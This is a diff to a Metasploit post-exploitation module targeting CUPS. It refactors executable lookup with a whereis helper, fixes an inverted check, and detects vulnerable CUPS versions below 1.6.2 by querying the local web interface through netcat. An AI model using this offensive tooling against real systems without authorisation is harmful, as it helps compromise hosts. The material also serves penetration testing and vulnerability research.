@@ -68,14 +68,13 @@ class Metasploit3 < Msf::Post
 			return Msf::Exploit::CheckCode::Safe
 		end
 
-		config_path = cmd_exec("which cups-config")
+		config_path = whereis("cups-config")
 		config_vn = nil
 
-		if not config_path.blank?
+		if config_path.blank?
 			# cups-config not present, ask the web interface what vn it is
 			output = get_request('/')
 			if output =~ /title.*CUPS\s+([\d\.]+)/i
-				print_status "Found CUPS #{$1}"
 				config_vn = $1.strip
 			else
 				print_error "Could not determine CUPS version."
@@ -84,6 +83,8 @@ class Metasploit3 < Msf::Post
 		else
 			config_vn = cmd_exec("cups-config --version").strip # use cups-config if installed
 		end
+
+		print_status "Found CUPS #{config_vn}"
 
 		config_parts = config_vn.split('.')
 		if config_vn.to_f < 1.6 or (config_vn.to_f <= 1.6 and config_parts[2].to_i < 2) # <1.6.2
@@ -125,8 +126,17 @@ class Metasploit3 < Msf::Post
 
 	private
 
-	def ctl_path; @ctl_path ||= cmd_exec("which cupsctl"); end
+	def ctl_path; @ctl_path ||= whereis("cupsctl"); end
 	def strip_http_headers(http); http.gsub(/\A(^.*\r\n)*/, ''); end
+
+	def whereis(exe)
+		line = cmd_exec("whereis #{exe}")
+		if line =~ /^\S+:\s*(\S+)/i
+			$1 # on ubuntu whereis returns "cupsctl: /usr/sbin/cupsctl"
+		else
+			line # on osx it just returns '/usr/sbin/cupsctl'
+		end
+	end
 
 	def get_request(uri)
 		output = perform_request(uri, 'nc -j localhost 631')
